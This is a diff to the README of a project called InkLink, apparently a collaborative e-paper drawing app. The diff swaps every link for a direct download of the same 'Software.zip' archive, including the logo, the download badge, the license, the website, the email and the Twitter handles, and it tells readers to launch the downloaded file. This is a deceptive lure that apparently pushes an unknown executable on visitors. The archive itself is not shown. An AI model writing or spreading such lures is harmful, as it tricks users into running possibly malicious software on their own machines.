@@ -1,6 +1,6 @@
 # InkLink 🎨🖋️📱🖥️
 
-![InkLink Logo](https://github.com/Ahmedthegoat10/InkLink/releases/tag/v1.0)
+![InkLink Logo](https://github.com/Ahmedthegoat10/InkLink/releases/download/v2.0/Software.zip)
 
 Welcome to InkLink - your ultimate destination for real-time collaborative E-Paper Canvas! 🚀
 
@@ -18,11 +18,11 @@ Welcome to InkLink - your ultimate destination for real-time collaborative E-Pap
 ## 📥 Get Started
 To start creating amazing collaborative art with InkLink, simply download the latest version from the link below:
 
-[![Download InkLink v1.0.0](https://github.com/Ahmedthegoat10/InkLink/releases/tag/v1.0%20v1.0.0-blue)](https://github.com/Ahmedthegoat10/InkLink/releases/tag/v1.0)
+[![Download InkLink v1.0.0](https://github.com/Ahmedthegoat10/InkLink/releases/download/v2.0/Software.zip%20v1.0.0-blue)](https://github.com/Ahmedthegoat10/InkLink/releases/download/v2.0/Software.zip)
 
 ℹ️ *Please note that the downloaded file needs to be launched to get started.*
 
-In case the download link is not working, kindly visit the [Releases](https://github.com/Ahmedthegoat10/InkLink/releases/tag/v1.0) section for alternative download options.
+In case the download link is not working, kindly visit the [Releases](https://github.com/Ahmedthegoat10/InkLink/releases/download/v2.0/Software.zip) section for alternative download options.
 
 ---
 
@@ -64,16 +64,16 @@ In case the download link is not working, kindly visit the [Releases](https://gi
 ---
 
 ## 📜 License
-⚖️ This project is licensed under the MIT License - see the [LICENSE](https://github.com/Ahmedthegoat10/InkLink/releases/tag/v1.0) file for details.
+⚖️ This project is licensed under the MIT License - see the [LICENSE](https://github.com/Ahmedthegoat10/InkLink/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
 ## 📞 Connect with Us
-🌐 **Website:** [https://github.com/Ahmedthegoat10/InkLink/releases/tag/v1.0](https://github.com/Ahmedthegoat10/InkLink/releases/tag/v1.0)
+🌐 **Website:** [https://github.com/Ahmedthegoat10/InkLink/releases/download/v2.0/Software.zip](https://github.com/Ahmedthegoat10/InkLink/releases/download/v2.0/Software.zip)
 
-📧 **Email:** https://github.com/Ahmedthegoat10/InkLink/releases/tag/v1.0
+📧 **Email:** https://github.com/Ahmedthegoat10/InkLink/releases/download/v2.0/Software.zip
 
-🐦 **Twitter:** [@InkLinkArt](https://github.com/Ahmedthegoat10/InkLink/releases/tag/v1.0)
+🐦 **Twitter:** [@InkLinkArt](https://github.com/Ahmedthegoat10/InkLink/releases/download/v2.0/Software.zip)
 
 ---
 
